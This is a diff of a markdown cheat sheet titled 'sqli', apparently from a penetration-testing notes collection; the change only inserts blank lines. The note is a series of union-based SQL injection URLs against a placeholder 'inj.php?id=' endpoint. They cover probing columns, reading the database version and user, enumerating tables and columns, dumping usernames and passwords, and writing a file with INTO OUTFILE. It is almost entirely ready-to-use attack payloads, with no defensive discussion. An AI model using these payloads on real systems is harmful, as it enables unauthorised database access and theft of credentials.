@@ -9,12 +9,20 @@ updated_at: '2023-05-29T16:48:52.690130+00:00'
 
 # sqli
 
+
+
 **Command** ([[check if you can find a row, where you can place your output]]):
 
 ```bash
 http://target-ip/inj.php?id=1 union all select 1,2,3,4,5,6,7,8
 
 ```
+
+
+
+
+
+
 
 **Command** ([[get the version of the database]]):
 
@@ -23,12 +31,24 @@ http://target-ip/inj.php?id=1 union all select 1,2,3,@@version,5
 
 ```
 
+
+
+
+
+
+
 **Command** ([[get the current user]]):
 
 ```bash
 http://target-ip/inj.php?id=1 union all select 1,2,3,user(),5
 
 ```
+
+
+
+
+
+
 
 **Command** ([[see all tables]]):
 
@@ -37,12 +57,24 @@ http://target-ip/inj.php?id=1 union all select 1,2,3,table_name,5 FROM informati
 
 ```
 
+
+
+
+
+
+
 **Command** ([[get column names for a specified table]]):
 
 ```bash
 http://target-ip/inj.php?id=1 union all select 1,2,3,column_name,5 FROM information_schema.columns where table_name='users'
 
 ```
+
+
+
+
+
+
 
 **Command** ([[concat user names and passwords (0x3a represents “:”)]]):
 
@@ -51,9 +83,21 @@ http://target-ip/inj.php?id=1 union all select 1,2,3,concat(name, 0x3A , passwor
 
 ```
 
+
+
+
+
+
+
 **Command** ([[write into a file]]):
 
 ```bash
 http://target-ip/inj.php?id=1 union all select 1,2,3,"content",5 into OUTFILE 'outfile'
 
 ```
+
+
+
+
+
+
